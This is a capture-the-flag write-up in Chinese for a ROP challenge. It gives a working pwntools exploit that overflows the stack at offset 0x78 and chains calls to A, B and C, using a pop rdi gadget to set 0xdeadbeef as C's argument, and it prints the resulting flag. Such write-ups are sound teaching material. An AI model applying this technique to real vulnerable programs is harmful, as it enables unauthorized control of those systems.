# Wetuwn Owiented Pwogwamming

## 题目简述

二进制有 NX，但无 Canary、无 PIE，栈溢出允许控制返回地址。程序要求按顺序调用 A、B、C 后再进入 win，其中 C 还要求第一个参数为 0xdeadbeef。需要用短 ROP 链完成函数序列和参数设置。

## 解题过程

cyclic 测得保存 RIP 偏移为 $0x70+8=0x78$。System V AMD64 ABI 用 RDI 传递第一个参数，因此在 B 与 C 之间插入 pop rdi; ret：

~~~python
from pwn import ROP, flat

rop = ROP(exe)
payload = flat({
    0x78: [
        exe.sym["A"],
        exe.sym["B"],
        rop.find_gadget(["pop rdi", "ret"])[0],
        0xdeadbeef,
        exe.sym["C"],
        exe.sym["win"],
    ],
})
io.sendlineafter(b"uwu owo rawrxd\n", payload)
~~~

A、B 返回时会依次从栈顶取下一地址；pop rdi 消耗紧随其后的常量，再返回 C。全部状态检查满足后 win 输出：

~~~text
maple{w-wop_is_pwetty_coow}
~~~

## 方法总结

ROP 的本质是按 ABI 编排寄存器和控制流。构造前应明确调用顺序、参数寄存器、栈偏移和返回行为；每个函数的 ret 都会消费一个 8 字节地址。NX 阻止直接执行栈上 shellcode，却不能阻止复用已有代码，PIE/ASLR 和控制流保护才会进一步增加 gadget 链难度。
